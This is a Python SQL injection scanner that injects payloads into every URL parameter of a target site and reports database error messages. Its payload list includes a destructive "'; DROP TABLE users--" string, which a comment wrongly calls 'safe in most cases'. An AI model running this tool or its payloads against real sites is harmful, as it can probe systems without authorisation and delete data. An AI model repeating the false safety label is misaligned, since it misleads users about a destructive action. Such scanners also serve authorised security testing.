#!/usr/bin/env python3
"""
SQL Injection Scanner - Efficient vulnerability detector
"""

import requests
import argparse
import concurrent.futures
import time
from urllib.parse import urlparse, parse_qs, urlencode
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple

@dataclass
class ScanResult:
    """Result of a vulnerability scan"""
    vulnerable: bool
    payload: str
    parameter: str
    error_type: Optional[str] = None
    response_time: Optional[float] = None

class SQLInjectionScanner:
    """SQL injection scanner with connection pooling and parallel testing"""
    
    # Focused payload set - removed redundant payloads
    PAYLOADS = [
        "'",                    # Basic quote test
        "' OR 1=1--",          # Classic boolean injection
        "' UNION SELECT 1--",  # Union-based test
        "'; DROP TABLE users--", # Destructive test (safe in most cases)
    ]
    
    # Compiled error patterns for faster matching
    SQL_ERRORS = {
        'mysql': ['mysql', 'sql syntax', 'mysql_fetch'],
        'postgresql': ['postgresql', 'pg_query', 'pg_exec'],
        'sqlite': ['sqlite', 'sqlite3'],
        'mssql': ['sql server', 'microsoft ole db', 'odbc'],
        'oracle': ['oracle', 'ora-', 'oci_'],
        'generic': ['unclosed quotation', 'quoted string not properly terminated', 'syntax error']
    }
    
    def __init__(self, timeout: int = 10, max_workers: int = 5):
        self.timeout = timeout
        self.max_workers = max_workers
        # Reuse session for connection pooling
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def detect_sql_error(self, response_text: str) -> Optional[str]:
        """Efficiently detect SQL errors and return error type"""
        text_lower = response_text.lower()
        
        for db_type, errors in self.SQL_ERRORS.items():
            for error in errors:
                if error in text_lower:
                    return db_type
        return None
    
    def test_payload(self, base_url: str, params: Dict, param_name: str, payload: str) -> ScanResult:
        """Test a single payload against a parameter"""
        try:
            start_time = time.time()
            
            # Create test parameters
            test_params = params.copy()
            test_params[param_name] = [payload]
            test_query = urlencode(test_params, doseq=True)
            
            parsed = urlparse(base_url)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            # Send request with session reuse
            response = self.session.get(test_url, timeout=self.timeout)
            response_time = time.time() - start_time
            
            # Check for SQL errors
            error_type = self.detect_sql_error(response.text)
            if error_type:
                return ScanResult(
                    vulnerable=True,
                    payload=payload,
                    parameter=param_name,
                    error_type=error_type,
                    response_time=response_time
                )
            
            return ScanResult(
                vulnerable=False,
                payload=payload,
                parameter=param_name,
                response_time=response_time
            )
            
        except Exception as e:
            print(f"[!] Error testing {param_name} with '{payload}': {e}")
            return ScanResult(vulnerable=False, payload=payload, parameter=param_name)
    
    def scan_url(self, url: str) -> List[ScanResult]:
        """Scan URL for SQL injection vulnerabilities with parallel testing"""
        print(f"\n[*] Scanning: {url}")
        
        parsed = urlparse(url)
        if not parsed.query:
            print("[!] No parameters found in URL")
            return []
        
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Prepare all test cases
        test_cases = []
        for param_name in params.keys():
            for payload in self.PAYLOADS:
                test_cases.append((base_url, params, param_name, payload))
        
        results = []
        vulnerabilities_found = []
        
        print(f"[*] Testing {len(test_cases)} combinations across {len(params)} parameters")
        
        # Execute tests in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_test = {
                executor.submit(self.test_payload, *test_case): test_case 
                for test_case in test_cases
            }
            
            for future in concurrent.futures.as_completed(future_to_test):
                result = future.result()
                results.append(result)
                
                if result.vulnerable:
                    vulnerabilities_found.append(result)
                    print(f"[!] VULNERABLE - Parameter: {result.parameter}, "
                          f"Payload: '{result.payload}', DB Type: {result.error_type}")
        
        if not vulnerabilities_found:
            print("\n[+] No vulnerabilities detected")
        else:
            print(f"\n[!] Found {len(vulnerabilities_found)} potential vulnerabilities")
        
        return results
    
    def close(self):
        """Clean up session"""
        self.session.close()

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Scanner')
    parser.add_argument('url', help='URL to test (e.g., http://example.com/page?id=1)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('-w', '--workers', type=int, default=5, help='Max parallel workers (default: 5)')
    
    args = parser.parse_args()
    
    if not urlparse(args.url).scheme:
        print("[!] Invalid URL format")
        return
    
    scanner = SQLInjectionScanner(timeout=args.timeout, max_workers=args.workers)
    
    try:
        start_time = time.time()
        results = scanner.scan_url(args.url)
        scan_time = time.time() - start_time
        
        print(f"\n[*] Scan completed in {scan_time:.2f} seconds")
        print("[!] Note: Always get permission before testing!")
        
    finally:
        scanner.close()

if __name__ == '__main__':
    main()
